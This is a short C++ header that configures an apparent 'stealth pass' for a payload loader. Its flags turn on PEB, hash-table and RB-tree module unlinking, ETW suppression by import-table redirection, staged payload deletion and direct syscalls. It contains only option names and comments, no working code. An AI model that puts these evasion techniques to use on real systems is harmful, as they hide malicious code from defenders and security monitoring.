#pragma once

#include <cstdint>

// Everything the stealth pass does is controlled from here. The defaults are
// the full pass; the command line can switch individual techniques off.
// Hides: nothing by itself; it only selects which passes run. Remains: whatever
// those passes cannot cover, documented in each module and in README.md.
struct Config {
    bool unlink_peb = true;      // all three loader lists
    bool unlink_hash = true;     // LdrpHashTable bucket chain
    bool unlink_rb = true;       // base-address + mapping-info RB nodes
    bool suppress_etw = true;    // IAT redirection of EtwEventWrite*
    bool stage = true;           // copy the payload to a temporary file name
    bool delete_staged = true;   // remove that copy after the image is mapped
    bool direct_syscalls = true; // runtime SSN/gadget trampolines where possible
    bool terminate_on_timeout = true;
    std::uint32_t wait_ms = 30000;
};
